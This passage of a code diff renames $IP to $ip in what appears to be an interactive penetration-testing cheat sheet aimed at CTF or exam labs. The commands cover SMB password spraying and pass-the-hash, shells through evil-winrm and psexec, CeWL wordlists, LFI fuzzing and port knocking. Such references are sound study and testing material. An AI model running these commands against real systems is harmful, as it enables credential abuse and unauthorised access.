 nxc smb $SUBNET/24 -u $USER -p $PASS --continue-on-success
 nxc smb $SUBNET/24 -u $USER -H $HASH --continue-on-success
 
 # crackmapexec fallback (identical syntax)
-crackmapexec smb $IP -u $USER -p $PASS
+crackmapexec smb $ip -u $USER -p $PASS
 
 # -- READ OUTPUT ---------------------------
 # [+] = valid creds
@@ -6272,18 +6314,18 @@ crackmapexec smb $IP -u $USER -p $PASS
 
 # -- CONNECT WITH VALID CREDS -------------
 # WinRM (most common)
-evil-winrm -i $IP -u $USER -p $PASS
-evil-winrm -i $IP -u $USER -H $HASH
+evil-winrm -i $ip -u $USER -p $PASS
+evil-winrm -i $ip -u $USER -H $HASH
 
 # SSH
-ssh $USER@$IP
+ssh $USER@$ip
 
 # SMB shell (psexec — needs admin share)
-impacket-psexec $USER:$PASS@$IP
-impacket-psexec -hashes $HASH $USER@$IP
+impacket-psexec $USER:$PASS@$ip
+impacket-psexec -hashes $HASH $USER@$ip
 
 # RDP
-xfreerdp /u:$USER /p:$PASS /v:$IP /cert-ignore
+xfreerdp /u:$USER /p:$PASS /v:$ip /cert-ignore
 
 # -- USERNAME VARIATIONS -------------------
 # If exact user fails, try variations:
@@ -6377,15 +6419,15 @@ grep -rn "pass" /home/ 2>/dev/null | grep -v "Binary\|\.swp\|#"`,
     body: "Rockyou fails when the password is application-specific or site-related. Generate custom wordlists from the target itself. CeWL scrapes the website. Username mutation covers credential stuffing. Crunch generates pattern-based lists.",
     cmd: `# -- CEWL — SCRAPE TARGET WEBSITE ---------
 # Generates wordlist from words found on the target site
-cewl http://$IP -d 3 -m 5 -w /tmp/cewl_wordlist.txt
+cewl http://$ip -d 3 -m 5 -w /tmp/cewl_wordlist.txt
 # -d 3 = crawl depth 3
 # -m 5 = minimum word length 5
 
 # With authentication
-cewl http://$IP -d 3 -m 5   --auth_type basic --auth_user admin --auth_pass password   -w /tmp/cewl_auth.txt
+cewl http://$ip -d 3 -m 5   --auth_type basic --auth_user admin --auth_pass password   -w /tmp/cewl_auth.txt
 
 # Include email addresses found
-cewl http://$IP -d 2 -e -w /tmp/cewl_emails.txt
+cewl http://$ip -d 2 -e -w /tmp/cewl_emails.txt
 
 # -- USERNAME GENERATION -------------------
 # From a name list (First Last format):
@@ -6432,7 +6474,7 @@ ls /opt/SecLists/Fuzzing/LFI/
 # Contains: C:\Windows\win.ini, web.config, applicationHost.config, etc.
 
 # Use with ffuf:
-ffuf -u "http://$IP/page?file=FUZZ"   -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt   -fw 0 -mc 200
+ffuf -u "http://$ip/page?file=FUZZ"   -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt   -fw 0 -mc 200
 
 # -- WEB DIRECTORY WORDLISTS ---------------
 # Fast (CTF/exam): raft-medium-directories.txt
@@ -6468,7 +6510,7 @@ cat rockyou.txt cewl_wordlist.txt | sort -u > /tmp/combined.txt`,
 
 # -- FIND THE SEQUENCE ---------------------
 # If you have LFI or file read:
-http://$IP/page?file=/etc/knockd.conf
+http://$ip/page?file=/etc/knockd.conf
 # knockd.conf shows sequence like:
 # sequence = 7000,8000,9000
 
@@ -6478,29 +6520,29 @@ cat /etc/knockd.conf 2>/dev/null || find / -name knockd.conf 2>/dev/null
 
 # -- EXECUTE THE KNOCK ---------------------
 # Method 1: knock tool
-knock $IP 7000 8000 9000
-knock $IP 7000:udp 8000:tcp 9000:tcp   # if mix of UDP/TCP
+knock $ip 7000 8000 9000
+knock $ip 7000:udp 8000:tcp 9000:tcp   # if mix of UDP/TCP
 
 # Method 2: nmap (no knock tool)
-nmap -Pn --host-timeout 100 --max-retries 0 -p 7000 $IP
-nmap -Pn --host-timeout 100 --max-retries 0 -p 8000 $IP
-nmap -Pn --host-timeout 100 --max-retries 0 -p 9000 $IP
+nmap -Pn --host-timeout 100 --max-retries 0 -p 7000 $ip
+nmap -Pn --host-timeout 100 --max-retries 0 -p 8000 $ip
+nmap -Pn --host-timeout 100 --max-retries 0 -p 9000 $ip
 
 # Method 3: nc
-nc -z $IP 7000
-nc -z $IP 8000
-nc -z $IP 9000
+nc -z $ip 7000
+nc -z $ip 8000
+nc -z $ip 9000
 
 # -- VERIFY PORT OPENED --------------------
 # After knock — check if target port is now open
-nmap -Pn -p 22 $IP
+nmap -Pn -p 22 $ip
 # Should now show open instead of filtered
 
 # -- TIMING --------------------------------
 # knockd has a timeout window (default 5 seconds between knocks)
 # If sequence times out — repeat from beginning
 # Some configs require specific intervals:
-knock $IP 7000 && sleep 1 && knock $IP 8000 && sleep 1 && knock $IP 9000`,
+knock $ip 7000 && sleep 1 && knock $ip 8000 && sleep 1 && knock $ip 9000`,
     warn: "The sequence must be executed in exact order with no extra connections in between. If nmap scans between knocks — the sequence resets. Use the knock tool or careful nc, not nmap for the knock itself.",
     choices: [
       { label: "Port opened — SSH now accessible", next: "ssh_only" },
